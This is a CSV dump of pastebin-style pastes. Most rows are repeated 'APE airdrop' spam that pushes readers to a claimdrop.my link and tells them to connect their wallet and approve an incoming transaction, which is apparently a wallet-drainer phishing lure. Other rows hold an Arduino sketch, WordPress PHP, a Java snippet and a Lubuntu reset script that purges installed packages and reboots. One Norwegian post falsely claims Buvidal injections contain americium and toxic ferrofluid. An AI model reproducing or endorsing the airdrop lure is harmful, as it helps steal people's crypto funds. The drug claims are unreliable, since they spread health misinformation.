id,title,username,language,date,content
r3RyLutL,🔥 Make $500+ from APE AIRDROP 🔥,GOURAV22,JavaScript,Friday 28th of February 2025 04:19:30 PM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#kpXGCZeHGL"
u0JhrEAg,🚨 FINAL CALL - $APE AIRDROP 🚨,GOURAV22,JavaScript,Friday 28th of February 2025 04:09:28 PM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#XLj7gQOLND"
cer8qrJ2,🚨 LAST CHANCE TO CLAIM APE COINS 🚨,Foot_Licker69,JavaScript,Friday 28th of February 2025 03:59:21 PM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#FM3iRah88I"
nbkP6C4S,FREE CRYPTO,Foot_Licker69,JavaScript,Friday 28th of February 2025 03:49:20 PM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#J7ecHDfIGP"
x6tffJaf,🔥 Make $500+ from APE AIRDROP 🔥,Foot_Licker69,JavaScript,Friday 28th of February 2025 03:39:18 PM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#OyLagxapTh"
ZTCF376E,🚨 FINAL CALL - $APE AIRDROP 🚨,Foot_Licker69,JavaScript,Friday 28th of February 2025 03:29:17 PM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#HWF3WeMfQm"
CNveaSVf,🚨 LAST CHANCE TO CLAIM APE COINS 🚨,Foot_Licker69,JavaScript,Friday 28th of February 2025 03:19:15 PM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#lQuy1KCvU0"
8E6hN9eR,FREE CRYPTO,Foot_Licker69,JavaScript,Friday 28th of February 2025 03:09:13 PM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#M0qd0OAEqi"
n0h2SZk0,"""LED Control"" rev_01",pleasedontcode,Arduino,Friday 28th of February 2025 03:08:21 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: ""LED Control""
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2025-02-28 21:07:34

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* lo start accende led per 5s (timer1 in interrupt) */
	/* dopo si spegne fino alla successiva pressione   il */
	/* pulsante di stop (interrupt) spegne l'uscita in */
	/* qualsiasi situazione  in interrupt come counter, */
	/* quando arriva a 10 spegnere tutto fino a che non */
	/* si */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <EasyButton.h>	//https://github.com/evert-arias/EasyButton

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t start_PushButton_PIN_D2		= 2;
const uint8_t stop_PushButton_PIN_D3		= 3;
const uint8_t count_PushButton_PIN_D4		= 4;
const uint8_t up_PIN_D8                     = 8; // Added for up button
const uint8_t down_PIN_A4                   = A4; // Added for down button
const uint8_t reset_PIN_D4                  = 4; // Reset pin (already defined)

/***** DEFINITION OF DIGITAL OUTPUT PINS *****/
const uint8_t out_LED_PIN_D5		= 5;

/***** DEFINITION OF OUTPUT RAW VARIABLES *****/
/***** used to store raw data *****/
bool	out_LED_PIN_D5_rawData		= 0;

/***** DEFINITION OF OUTPUT PHYSICAL VARIABLES *****/
/***** used to store data after characteristic curve transformation *****/
float	out_LED_PIN_D5_phyData		= 0.0;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/

// Global variables for USER CODE
int cont = 0;
int flag = 0;
bool ledActive = false; // To track if the LED is active

void setup(void)
{
	// put your setup code here, to run once:

	pinMode(start_PushButton_PIN_D2,	INPUT_PULLUP);
	pinMode(stop_PushButton_PIN_D3,	INPUT_PULLUP);
	pinMode(count_PushButton_PIN_D4,	INPUT_PULLUP);
	pinMode(out_LED_PIN_D5,	 OUTPUT);

	// USER CODE setup
	pinMode(LED_BUILTIN, OUTPUT);
	pinMode(up_PIN_D8, INPUT); // up
	pinMode(down_PIN_A4, INPUT); // down
	pinMode(reset_PIN_D4, INPUT); // reset
	Serial.begin(9600);
	TCCR1A = 0B00000000; // Normal Mode
	TIMSK1 = 0B00000001; // INT on overflow
	TCNT1 = -15625;
	sei();
}

void loop(void)
{
	// put your main code here, to run repeatedly:
	updateOutputs(); // Refresh output data

	// USER CODE loop
	if (flag == 1) { // 5 seconds have passed
		flag = 0;
		ledActive = false; // Deactivate LED
		out_LED_PIN_D5_rawData = LOW; // Turn off LED
		Serial.println(""LED turned off after 5 seconds"");
	}
}

// Function to start the LED
void startLED() {
	ledActive = true; // Set LED active
	out_LED_PIN_D5_rawData = HIGH; // Turn on LED
	cont = 0; // Reset counter
	Serial.println(""LED started"");
}

// Function to stop the LED
void stopLED() {
	ledActive = false; // Set LED inactive
	out_LED_PIN_D5_rawData = LOW; // Turn off LED
	cont = 0; // Reset counter
	Serial.println(""LED stopped"");
}

/***** TIMER INTERRUPT FUNCTION *****/
ISR(TIMER1_OVF_vect) { // Timer interrupt function
	if (ledActive) {
		cont++;
		if (cont >= 5) { // 5 seconds
			flag = 1; // Set flag to indicate timeout
		}
	}
	TCNT1 = -15625; // Reset timer
}

// Update outputs
void updateOutputs()
{
	digitalWrite(out_LED_PIN_D5, out_LED_PIN_D5_rawData);
}

// Button press handling
void handleButtonPress() {
	if (digitalRead(start_PushButton_PIN_D2) == LOW) {
		startLED(); // Start LED on button press
	}
	if (digitalRead(stop_PushButton_PIN_D3) == LOW) {
		stopLED(); // Stop LED on button press
	}
}

/* END CODE */"
iwQZ8VCJ,Customize the default wp die page ( error 404 ),nshelper,PHP,Friday 28th of February 2025 03:03:58 PM CDT,"<?php

    add_filter('wp_die_handler', 'custom_wp_die_handler', 999, 3 );
    function custom_wp_die_handler( $message, $title = '', $args = array() )
        {
            list( $message, $title, $parsed_args ) = _wp_die_process_input( $message, $title, $args );

            if ( is_string( $message ) ) {
                if ( ! empty( $parsed_args['additional_errors'] ) ) {
                    $message = array_merge(
                        array( $message ),
                        wp_list_pluck( $parsed_args['additional_errors'], 'message' )
                    );
                    $message = ""<ul>\n\t\t<li>"" . implode( ""</li>\n\t\t<li>"", $message ) . ""</li>\n\t</ul>"";
                }

                $message = sprintf(
                    '<p>%s</p>',
                    $message
                );
            }

            $have_gettext = function_exists( '__' );

            if ( ! empty( $parsed_args['link_url'] ) && ! empty( $parsed_args['link_text'] ) ) {
                $link_url = $parsed_args['link_url'];
                if ( function_exists( 'esc_url' ) ) {
                    $link_url = esc_url( $link_url );
                }
                $link_text = $parsed_args['link_text'];
                $message  .= ""\n<p><a href='{$link_url}'>{$link_text}</a></p>"";
            }

            if ( isset( $parsed_args['back_link'] ) && $parsed_args['back_link'] ) {
                $back_text = $have_gettext ? __( '&laquo; Back' ) : '&laquo; Back';
                $message  .= ""\n<p><a href='javascript:history.back()'>$back_text</a></p>"";
            }

            if ( ! did_action( 'admin_head' ) ) :
                if ( ! headers_sent() ) {
                    header( ""Content-Type: text/html; charset={$parsed_args['charset']}"" );
                    status_header( $parsed_args['response'] );
                    nocache_headers();
                }

                $text_direction = $parsed_args['text_direction'];
                $dir_attr       = ""dir='$text_direction'"";

                // If `text_direction` was not explicitly passed,
                // use get_language_attributes() if available.
                if ( empty( $args['text_direction'] )
                    && function_exists( 'language_attributes' ) && function_exists( 'is_rtl' )
                ) {
                    $dir_attr = get_language_attributes();
                }
                ?>
            <!DOCTYPE html>
            <html <?php echo $dir_attr; ?>>
            <head>
                <meta http-equiv=""Content-Type"" content=""text/html; charset=<?php echo $parsed_args['charset']; ?>"" />
                    <?php
                    if ( function_exists( 'wp_robots' ) && function_exists( 'wp_robots_no_robots' ) && function_exists( 'add_filter' ) ) {
                        add_filter( 'wp_robots', 'wp_robots_no_robots' );
                        wp_robots();
                    }
                    ?>
                <title><?php echo $title; ?></title>

                <meta http-equiv=""X-UA-Compatible"" content=""IE=edge"">
                <meta name=""viewport"" content=""width=device-width, initial-scale=1"">

                <style media=""all"">
                    @import url(https://fonts.googleapis.com/css?family=opensans:500);
                    ._1,._404,.c{position:relative}body,hr{color:#fff}body,hr:after{background:#3c9}body{font-family:'Open Sans',sans-serif;max-height:700px;overflow:hidden}.c{text-align:center;display:block;width:80%;margin:100px auto}._404{font-size:220px;display:inline-block;z-index:2;height:250px;letter-spacing:15px}._1,hr:after{font-size:2em}._1,._2{display:block;text-align:center}._1{letter-spacing:12px;line-height:80%;padding:20px}._2{position:relative;font-size:20px}.btn,.text,hr:after{display:inline-block;position:relative}.text{font-size:70px;text-align:center;margin:19px 0 0;z-index:3;width:100%;line-height:1.2em}.btn{background-color:#fff;width:358px;padding:5px;z-index:5;font-size:25px;margin:0 10px 0 auto;color:#3c9;text-decoration:none}.cloud,.cloud:after,.cloud:before{position:absolute;background:#fff;z-index:-1}.right{float:right;width:60%}hr{padding:0;border:none;border-top:5px solid #fff;text-align:center;margin:0 auto;width:420px;height:10px;z-index:-10}hr:after{content:""\2022"";top:-.75em;padding:0 .2em}.cloud{width:350px;height:120px;background:linear-gradient(top,#fff 100%);background:-webkit-linear-gradient(top,#fff 100%);background:-moz-linear-gradient(top,#fff 100%);background:-ms-linear-gradient(top,#fff 100%);background:-o-linear-gradient(top,#fff 100%);border-radius:100px;-webkit-border-radius:100px;-moz-border-radius:100px;margin:120px auto 20px;transition:1s}.cloud:after,.cloud:before{content:''}.cloud:after{width:100px;height:100px;top:-50px;left:50px;border-radius:100px;-webkit-border-radius:100px;-moz-border-radius:100px}.cloud:before{width:180px;height:180px;top:-90px;right:50px;border-radius:200px;-webkit-border-radius:200px;-moz-border-radius:200px}.x1{top:-50px;left:100px;-webkit-transform:scale(.3);-moz-transform:scale(.3);transform:scale(.3);opacity:.9;-webkit-animation:15s linear infinite moveclouds;-moz-animation:15s linear infinite moveclouds;-o-animation:15s linear infinite moveclouds}.x1_5{top:-80px;left:250px;-webkit-transform:scale(.3);-moz-transform:scale(.3);transform:scale(.3);-webkit-animation:17s linear infinite moveclouds;-moz-animation:17s linear infinite moveclouds;-o-animation:17s linear infinite moveclouds}.x2,.x3{left:250px;-webkit-animation:25s linear infinite moveclouds;-moz-animation:25s linear infinite moveclouds;-o-animation:25s linear infinite moveclouds}.x2{top:30px;-webkit-transform:scale(.6);-moz-transform:scale(.6);transform:scale(.6);opacity:.6}.x3{bottom:-70px;-webkit-transform:scale(.6);-moz-transform:scale(.6);transform:scale(.6);opacity:.8}.x4{left:470px;botttom:20px;-webkit-transform:scale(.75);-moz-transform:scale(.75);transform:scale(.75);opacity:.75;-webkit-animation:18s linear infinite moveclouds;-moz-animation:18s linear infinite moveclouds;-o-animation:18s linear infinite moveclouds}.x5{left:200px;top:300px;-webkit-transform:scale(.5);-moz-transform:scale(.5);transform:scale(.5);opacity:.8;-webkit-animation:20s linear infinite moveclouds;-moz-animation:20s linear infinite moveclouds;-o-animation:20s linear infinite moveclouds}@-webkit-keyframes moveclouds{0%{margin-left:1000px}100%{margin-left:-1000px}}@-moz-keyframes moveclouds{0%{margin-left:1000px}100%{margin-left:-1000px}}@-o-keyframes moveclouds{0%{margin-left:1000px}100%{margin-left:-1000px}}
                </style>


                </head>
                <body>
                <?php endif; // ! did_action( 'admin_head' ) ?>
                
                
                 <div id=""clouds"">
                    <div class=""cloud x1""></div>
                    <div class=""cloud x1_5""></div>
                    <div class=""cloud x2""></div>
                    <div class=""cloud x3""></div>
                    <div class=""cloud x4""></div>
                    <div class=""cloud x5""></div>
                </div>
                <div class='c'>
                    <div class='_404'><?php if ( isset ( $args['response'] ) ) { echo $args['response']; } else { echo '404'; } ?></div>
                    <hr>
                    <div class='_1'><?php echo $title ?></div>
                    <div class='_2'>&nbsp;</div>
                    <a class='btn' href='<?php echo get_site_url(); ?>'>BACK TO MARS</a>
                </div>
                    

                </body>
                </html>
                <?php
                if ( $parsed_args['exit'] ) {
                    die();
                }                            
            
            
        }"
0WiePZgn,buvidal,Nix71,C++,Friday 28th of February 2025 03:02:29 PM CDT,"en buvidal eske jeg rappa når jeg gikk på buvidal.
tydeligvis at noe går under det berømte bordet.

en sa til meg at sprøyter med små mg skal være gule og de 96 mg skal være grå..

har hørt at de grå består av tre komponenter.. kan bare gjette,, giftig ferrofluid,,amaricium 242,,buprenorphin.

så føler jeg har blitt forgiftet. var jo den første som begynte på buvidal.

og hvorfor lukter det så dritt av subutexen min..

noen sier det er kvinnelige kjønnshormoner i de...

kanskje derfor jeg blir så tjukk..

https://ibb.co/0j00Q121
https://ibb.co/SD9x9ztx



kåre bull"
MVaUUen1,🔥 Make $500+ from APE AIRDROP 🔥,Foot_Licker69,JavaScript,Friday 28th of February 2025 02:59:10 PM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#ej7cULs6cC"
Ass0rzEF,🚨 FINAL CALL - $APE AIRDROP 🚨,Foot_Licker69,JavaScript,Friday 28th of February 2025 02:49:08 PM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#Y3WnqDl03y"
xD9ZStcr,Restore Lubuntu script,3th1ca14aX0r,Bash,Friday 28th of February 2025 02:43:51 PM CDT,"#!/bin/bash

# Step 1: Reset dconf settings
echo ""Resetting system settings...""
dconf reset -f /

# Step 2: Backup and clear user-specific configurations
echo ""Backing up and clearing user-specific configurations...""
timestamp=$(date +%Y%m%d_%H%M%S)
mkdir -p ~/backup_configs_$timestamp
mv ~/.config ~/.local ~/.cache ~/backup_configs_$timestamp 2>/dev/null

# Step 3: Remove all packages installed after the initial setup
echo ""Identifying and removing user-installed packages...""
install_log=""/var/log/apt/history.log""
if [ -f ""$install_log"" ]; then
    grep ""Install:"" $install_log | awk '{print $4}' | sed 's/,//g' > /tmp/user_installed_packages.txt
    while IFS= read -r package; do
        sudo apt purge -y ""$package""
    done < /tmp/user_installed_packages.txt
else
    echo ""APT history log not found. Skipping package removal.""
fi

# Step 4: Clean up unused dependencies and cache
echo ""Cleaning up unused dependencies and cache...""
sudo apt autoremove -y
sudo apt autoclean

# Step 5: Reinstall Lubuntu desktop environment
echo ""Reinstalling Lubuntu desktop environment...""
sudo apt install --reinstall lubuntu-desktop -y

# Step 6: Notify completion
echo ""System reset complete. Rebooting now...""
sudo reboot
"
06zLeGKk,🚨 LAST CHANCE TO CLAIM APE COINS 🚨,Foot_Licker69,JavaScript,Friday 28th of February 2025 02:38:34 PM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#U1ul9JhJ8I"
TcKajaQV,FREE CRYPTO,Foot_Licker69,JavaScript,Friday 28th of February 2025 02:28:29 PM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#QeDeKUEtSc"
4BvecMZL,🔥 Make $500+ from APE AIRDROP 🔥,Foot_Licker69,JavaScript,Friday 28th of February 2025 02:18:27 PM CDT,"https://claimdrop.my/?g=2PSGWUKRS99HLEYFKIHAZZ8AAYB2A3ADCFJQNVWFQMUSD

There is just one hour left to claim new APE coins - you can get between $400 to $800

If you claim them from my reflink we both gonna get 10% more. To claim it just connect your active wallet and accept the incoming transaction with coins.

#isdUn6yOVT"
F6rDYtpa,пенисы,dxvmxnd,Java,Friday 28th of February 2025 02:15:45 PM CDT,"					try {
                        // создание класса по имени
                        Class<?> clazz = Class.forName(className);
                        // бебрация конструктора с параметрами double, double, double, double
                        Constructor<?> constructor;
                        
                        constructor = clazz.getDeclaredConstructor(double.class, double.class, double.class, double.class);

                        //  бабахаем экземпляр класса
                        Object instance;
                        instance = constructor.newInstance(num1, num2, num3, num4);


                        showDialog.dispose();
                        // выZOV метода
                        Method showGraph = clazz.getMethod(""showGraph"");
                        showGraph.invoke(instance);
                    } catch (Exception e1) {
                        e1.printStackTrace();
                    }"
